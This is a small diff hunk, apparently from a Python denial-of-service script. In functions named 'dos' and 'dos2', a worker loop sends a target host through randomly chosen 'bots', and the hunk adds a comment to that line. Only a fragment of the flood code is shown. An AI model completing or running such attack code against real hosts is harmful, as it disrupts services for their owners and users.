@@ -61,7 +61,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_attacking(random.choice(bots)+"http://"+host)
+		bot_attacking(random.choice(bots)+"http://"+host) #it's not neccessary to put the target here
 		w.task_done()
 
 
